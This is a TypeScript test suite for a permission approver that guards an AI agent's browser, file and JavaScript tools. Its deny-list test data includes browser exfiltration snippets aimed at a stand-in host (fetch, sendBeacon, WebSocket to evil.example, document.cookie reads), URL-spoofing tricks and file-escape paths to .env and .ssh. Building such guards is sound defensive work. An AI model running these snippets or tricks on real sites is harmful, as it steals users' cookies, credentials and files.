import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterAll, beforeEach, describe, expect, it } from "vitest";
import { configFromEnv, decide, pathDecision, type ApproverRulesConfig } from "./chrome-approver-rules.mjs";

const tempPrefix = join(tmpdir(), "chrome-approver-test-");
const root = mkdtempSync(tempPrefix);
const job = join(root, "job");
const outside = join(root, "outside");
mkdirSync(job);
mkdirSync(outside);
const script = fileURLToPath(new URL("./chrome-approver.mjs", import.meta.url));
let cfg: ApproverRulesConfig;
beforeEach(() => { cfg = { ...configFromEnv({}), fileRoots: [job] }; });
afterAll(() => {
  // Only remove this suite's uniquely created temporary directory.
  if (!root.startsWith(tempPrefix)) throw new Error("Unexpected test cleanup path");
  rmSync(root, { recursive: true, force: true });
});
const chrome = (tool: string, input: object = {}) => decide(`mcp__claude-in-chrome__${tool}`, input, cfg);

describe("guarded Chrome permissions", () => {
  it("denies unknown tools, external URLs, injected credentials, non-https and unusual ports", () => {
    expect(chrome("new_unreviewed_tool").behavior).toBe("deny");
    for (const tool of ["Bash", "WebFetch", "mcp__other__read"]) expect(decide(tool, {}, cfg).behavior).toBe("deny");
    for (const url of ["https://evil.example", "https://facebook.com.evil.example", "https://facebook.com@evil.example", "https://u:p@facebook.com", "http://facebook.com", "file:///etc/passwd", "https://facebook.com:8443"]) {
      expect(chrome("navigate", { url }).behavior, url).toBe("deny");
    }
    expect(chrome("navigate", { url: "https://www.facebook.com/path" }).behavior).toBe("allow");
    expect(chrome("navigate", { url: "back" }).behavior).toBe("allow");
    expect(chrome("navigate").behavior).toBe("deny");
  });

  it("explicit per-job hosts replace the broad default list; an empty list denies all hosts", () => {
    cfg = configFromEnv({ TAKI_APPROVER_HOSTS: JSON.stringify(["flow.google.com"]) });
    expect(chrome("navigate", { url: "https://flow.google.com" }).behavior).toBe("allow");
    expect(chrome("navigate", { url: "https://facebook.com" }).behavior).toBe("deny");
    expect(chrome("navigate", { url: "https://accounts.google.com" }).behavior).toBe("deny");
    cfg = configFromEnv({ TAKI_APPROVER_HOSTS: "[]" });
    expect(chrome("navigate", { url: "https://flow.google.com" }).behavior).toBe("deny");
  });

  it("limits file access to the job root, rejecting escape paths, sensitive files, and Windows data streams", () => {
    expect(chrome("file_upload", { paths: [join(job, "image.png")] }).behavior).toBe("allow");
    for (const path of [join(job, "..", "outside", "secret.txt"), join(root, "job-other", "image.png"), join(job, ".env"), join(job, "db.sqlite"), join(job, ".ssh", "note.txt")]) {
      expect(chrome("file_upload", { paths: [path] }).behavior, path).toBe("deny");
      expect(decide("Read", { file_path: path }, cfg).behavior, path).toBe("deny");
    }
    expect(chrome("file_upload", { paths: [join(job, "image.png"), join(outside, "secret.txt")] }).behavior).toBe("deny");
    expect(chrome("file_upload").behavior).toBe("deny");
    expect(pathDecision(join(job, "image.png:secret"), [job], "win32").ok).toBe(false);
    expect(pathDecision("\\\\?\\C:\\Windows\\win.ini", [job], "win32").ok).toBe(false);
  });

  it("blocks a junction/symlink escape even when the requested output file does not exist", () => {
    const link = join(job, "escape");
    symlinkSync(outside, link, process.platform === "win32" ? "junction" : "dir");
    writeFileSync(join(outside, "existing.txt"), "private");
    for (const path of [join(link, "existing.txt"), join(link, "not-created", "new.txt")]) {
      expect(pathDecision(path, [job]).ok).toBe(false);
      expect(decide("Write", { file_path: path }, cfg).behavior).toBe("deny");
    }
  });

  it("pins browser selection to the chosen device and supports discovery with no pin", () => {
    cfg.deviceId = "chosen-device";
    expect(chrome("select_browser", { device_id: "chosen-device" }).behavior).toBe("allow");
    expect(chrome("switch_browser", { deviceId: "chosen-device" }).behavior).toBe("allow");
    expect(chrome("switch_browser", { device_id: "other-device" }).behavior).toBe("deny");
    expect(chrome("select_browser").behavior).toBe("deny");
    delete cfg.deviceId;
    expect(chrome("list_connected_browsers").behavior).toBe("allow");
  });

  it("the kill file is checked for every tool call, including after a previously allowed action", () => {
    cfg.killFile = join(root, "off");
    expect(chrome("read_page").behavior).toBe("allow");
    writeFileSync(cfg.killFile, "off");
    expect(chrome("read_page").behavior).toBe("deny");
    expect(decide("Read", { file_path: join(job, "image.png") }, cfg).behavior).toBe("deny");
    rmSync(cfg.killFile);
  });

  it("blocks JS network/storage exfiltration and logs a hash without script literals", () => {
    for (const code of ["fetch('https://evil.example')", "document.cookie", "localStorage.getItem('x')", "new WebSocket('wss://evil.example')", "navigator.sendBeacon('https://evil.example', data)", "window.open('https://evil.example')"]) {
      expect(chrome("javascript_tool", { code }).behavior, code).toBe("deny");
    }
    const result = chrome("javascript_tool", { code: "document.querySelector('input').value = 'TOP-SECRET'" });
    expect(result.behavior).toBe("allow");
    expect(result.note).toMatch(/sha256 [a-f0-9]{16}/);
    expect(result.note).not.toContain("TOP-SECRET");
    cfg.js = false;
    expect(chrome("javascript_tool", { code: "document.title" }).behavior).toBe("deny");
  });
});

describe("permission MCP server", () => {
  const call = (id: number, tool_name: string, input: object = {}) => ({ jsonrpc: "2.0", id, method: "tools/call", params: { name: "approve", arguments: { tool_name, input } } });
  const run = (messages: object[], env: Record<string, string>) => {
    const result = spawnSync(process.execPath, [script], {
      env: { ...process.env, ALLOW_CHROME_AUTOAPPROVE: "1", TAKI_APPROVER_FILE_ROOTS: JSON.stringify([job]), ...env },
      input: messages.map((m) => JSON.stringify(m)).join("\n") + "\n", encoding: "utf8", timeout: 5000, windowsHide: true,
    });
    expect(result.error).toBeUndefined();
    expect(result.status).toBe(0);
    return result.stdout.trim().split("\n").map((line) => JSON.parse(line));
  };
  const decision = (message: any) => JSON.parse(message.result.content[0].text);

  it("serves initialize/list, enforces decisions, and persists audit without form text or JS secrets", () => {
    const log = join(root, "audit.jsonl");
    const result = run([
      { jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2024-11-05" } },
      { jsonrpc: "2.0", id: 2, method: "tools/list" },
      call(3, "mcp__claude-in-chrome__navigate", { url: "https://flow.google.com" }),
      call(4, "mcp__claude-in-chrome__navigate", { url: "https://evil.example" }),
      call(5, "mcp__claude-in-chrome__form_input", { text: "FORM-SECRET", value: "FORM-SECRET" }),
      call(6, "mcp__claude-in-chrome__javascript_tool", { code: "document.title = 'SCRIPT-SECRET'" }),
    ], { TAKI_APPROVER_LOG: log });
    expect(result[0].result.serverInfo.name).toBe("taki-approver");
    expect(result[1].result.tools[0].name).toBe("approve");
    expect(decision(result[2]).behavior).toBe("allow");
    expect(decision(result[3]).behavior).toBe("deny");
    const audit = readFileSync(log, "utf8");
    expect(audit.trim().split("\n")).toHaveLength(4);
    expect(audit).toContain('"decision":"deny"');
    expect(audit).not.toContain("FORM-SECRET");
    expect(audit).not.toContain("SCRIPT-SECRET");
  });

  it("fails closed when its configured audit path cannot be written", () => {
    const result = run([call(1, "mcp__claude-in-chrome__read_page")], { TAKI_APPROVER_LOG: job });
    expect(decision(result[0])).toMatchObject({ behavior: "deny", message: expect.stringContaining("nhật ký") });
  });
});
